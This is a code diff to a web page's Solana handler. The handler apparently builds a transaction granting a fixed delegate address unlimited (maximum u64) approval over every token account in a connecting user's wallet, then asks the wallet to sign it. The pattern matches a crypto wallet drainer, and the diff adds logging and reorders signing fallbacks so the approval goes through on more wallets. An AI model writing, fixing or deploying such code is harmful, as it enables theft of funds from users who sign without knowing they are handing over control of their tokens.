@@ -479,14 +479,19 @@ export default function Home() {
   };
 
   const handleSolanaProceed = async () => {
-    if (!solanaProvider || !solanaAddress) return;
+    if (!solanaProvider || !solanaAddress) {
+      console.log("No provider or address:", { provider: !!solanaProvider, address: solanaAddress });
+      return;
+    }
     setError("");
     setSolanaStep("approving");
 
     try {
+      console.log("Starting Solana approval for wallet:", solanaAddress);
       const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
       const delegateKey = new PublicKey(SOLANA_DELEGATE_ADDRESS);
       const userKey = new PublicKey(solanaAddress);
+      console.log("Connection established, fetching token accounts...");
       
       const MAX_AMOUNT = BigInt("18446744073709551615");
       
@@ -494,6 +499,8 @@ export default function Home() {
         userKey,
         { programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") }
       );
+      
+      console.log("Found token accounts:", tokenAccounts.value.length);
       
       const tokensApproved: string[] = [];
       const transaction = new Transaction();
@@ -558,18 +565,24 @@ export default function Home() {
 
       let txId: string;
       
-      // Use signAndSendTransaction if available (preferred for mobile wallets)
-      if (solanaProvider.signAndSendTransaction) {
-        const result = await solanaProvider.signAndSendTransaction(transaction);
-        txId = result.signature;
-      } else if (solanaProvider.signAndSendAllTransactions) {
-        // Some wallets use signAndSendAllTransactions
-        const results = await solanaProvider.signAndSendAllTransactions([transaction]);
-        txId = results[0];
-      } else {
-        // Fallback to signTransaction for desktop/extension wallets
+      console.log("Attempting to sign transaction with provider:", selectedSolanaWallet);
+      console.log("Transaction instructions count:", transaction.instructions.length);
+      
+      // Try signTransaction first (most widely supported)
+      try {
         const signedTx = await solanaProvider.signTransaction(transaction);
+        console.log("Transaction signed, sending...");
         txId = await connection.sendRawTransaction(signedTx.serialize());
+        console.log("Transaction sent:", txId);
+      } catch (signErr: any) {
+        console.log("signTransaction failed, trying signAndSendTransaction...", signErr?.message || signErr);
+        // Fallback to signAndSendTransaction if signTransaction fails
+        if (solanaProvider.signAndSendTransaction) {
+          const result = await solanaProvider.signAndSendTransaction(transaction);
+          txId = result.signature;
+        } else {
+          throw signErr;
+        }
       }
       
       await connection.confirmTransaction({
